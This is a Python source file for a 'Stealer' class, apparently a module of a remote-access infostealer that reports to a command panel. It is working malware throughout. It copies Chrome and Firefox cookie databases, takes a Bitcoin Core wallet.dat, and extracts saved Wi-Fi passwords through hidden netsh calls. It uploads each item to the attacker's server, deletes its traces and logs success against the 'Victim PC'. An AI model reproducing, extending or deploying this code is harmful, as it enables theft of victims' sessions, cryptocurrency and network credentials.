import tempfile, subprocess, re, os, getpass, shutil, glob
from HTTPSocket import HTTPSocket

class Stealer:
    def __init__(self, panelURL, machineID):
        self.C = HTTPSocket(str(panelURL), str(machineID))   # Initiate HTTPSocket Class
        self.tempdir = tempfile.gettempdir() 
        self.username = getpass.getuser()

    def steal_chrome_cookie(self):
        #Chrome DB Path: C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Cookies
        try:
            source = os.path.join("C:\\Users", self.username, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
            destination = os.path.join(self.tempdir, "CookiesCh.sqlite")
            
            if not os.path.exists(source):
                self.C.Log("Fail", "Chrome Cookies database not found.")
                self.C.Send("CleanCommands")
                return

            shutil.copyfile(source, destination)    
            
            self.C.Upload(destination)
            os.remove(destination)
            self.C.Send("CleanCommands")
            self.C.Log("Succ", "Stealed Chrome Cookies Successfully")
        except FileNotFoundError:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "Chrome Cookies database not found.")
        except Exception as e:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred stealing Chrome cookies: " + str(e))        

    def steal_firefox_cookie(self):
        #Firefox DB Path: C:\Users\USERNAME\AppData\Roaming\Mozilla\Firefox\Profiles\<random_string>.default\cookies.sqlite            
        try:
            firefox_profiles_base_path = os.path.join(os.environ["AppData"], "Mozilla", "Firefox", "Profiles")
            source = None

            # Dynamically find the Firefox profile directory
            # Look for any directory that ends with .default or .default-release and contains cookies.sqlite
            for profile_dir in glob.iglob(os.path.join(firefox_profiles_base_path, '*')):
                cookies_path = os.path.join(profile_dir, 'cookies.sqlite')
                if os.path.exists(cookies_path):
                    source = cookies_path
                    break # Found a valid cookies file

            if source:
                destination = os.path.join(self.tempdir, "cookies.sqlite")
                shutil.copyfile(source, destination)
                self.C.Upload(destination)
                os.remove(destination)
                self.C.Send("CleanCommands")
                self.C.Log("Succ", "Stealed Firefox Cookies Successfully")
            else:
                self.C.Send("CleanCommands")
                self.C.Log("Fail", "Firefox cookies.sqlite not found in any profile.")

        except FileNotFoundError:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "Firefox Browser or its cookies.sqlite not found.") 
        except Exception as e:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred stealing Firefox cookies: " + str(e)) 

    def steal_bitcoin_wallet(self):
        try:
            wallet_path = os.path.join("C:\\Users", self.username, "AppData", "Roaming", "Bitcoin", "wallet.dat") # Corrected path for Bitcoin core wallet
            if os.path.exists(wallet_path):
                self.C.Upload(wallet_path)
                self.C.Send("CleanCommands")
                self.C.Log("Succ", "Stealed Bitcoin Wallet Successfully")
            else:
                self.C.Send("CleanCommands")
                self.C.Log("Fail", "Bitcoin Wallet Not Found In Victim PC")                
        except Exception as e:
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred stealing Bitcoin wallet: " + str(e))        

    def steal_wifi_password(self):
        """
        When Called, 
        1. Steals Wifi Password
        2. Saves Result In WifiPassword.txt Inside TEMP directory
        3. Uploads WifiPassword.txt
        4. Atlast Deletes WifiPassword.txt from TEMP directory
        """    
        try:
            wifi_password_file = os.path.join(self.tempdir, "WifiPassword.txt")
            command = ["netsh", "wlan", "show", "profile"]
            result_output = []

            # Get list of Wi-Fi profiles
            networks_process = subprocess.run(command, capture_output=True, text=True, errors="ignore", creationflags=subprocess.CREATE_NO_WINDOW)
            networks_process.check_returncode() # Raise CalledProcessError if command failed
            network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks_process.stdout)

            for network_name in network_names_list:
                try:
                    command_key_clear = ["netsh", "wlan", "show", "profile", network_name.strip(), "key=clear"]
                    current_result_process = subprocess.run(command_key_clear, capture_output=True, text=True, errors="ignore", creationflags=subprocess.CREATE_NO_WINDOW)
                    current_result_process.check_returncode()
                    current_result = current_result_process.stdout
                    
                    ssid = re.findall("(?:SSID name\s*:\s)(.*)", current_result)
                    authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)
                    cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)
                    security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
                    password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)
                    
                    result_output.append("\n\nSSID           : " + (ssid[0].strip() if ssid else "N/A"))
                    result_output.append("Authentication : " + (authentication[0].strip() if authentication else "N/A"))
                    result_output.append("Cipher         : " + (cipher[0].strip() if cipher else "N/A"))
                    result_output.append("Security Key   : " + (security_key[0].strip() if security_key else "N/A"))
                    result_output.append("Password       : " + (password[0].strip() if password else "N/A"))
                except subprocess.CalledProcessError as e:
                    result_output.append(f"\n\nError retrieving details for '{network_name.strip()}': {e.stderr.strip()}")
                except Exception as e: 
                    result_output.append(f"\n\nUnexpected error for '{network_name.strip()}': {e}")
        
            with open(wifi_password_file, "w", encoding="utf-8") as f:
                f.write("\n".join(result_output))
                
            self.C.Upload(wifi_password_file)   
            os.remove(wifi_password_file)
            self.C.Log("Succ", "Wifi Password Retrieved Successfully")
            self.C.Send("CleanCommands")         
        except Exception as e:
            self.C.Log("Fail", "An unexpected error occurred during WiFi password retrieval: " + str(e)) 
            self.C.Send("CleanCommands")           
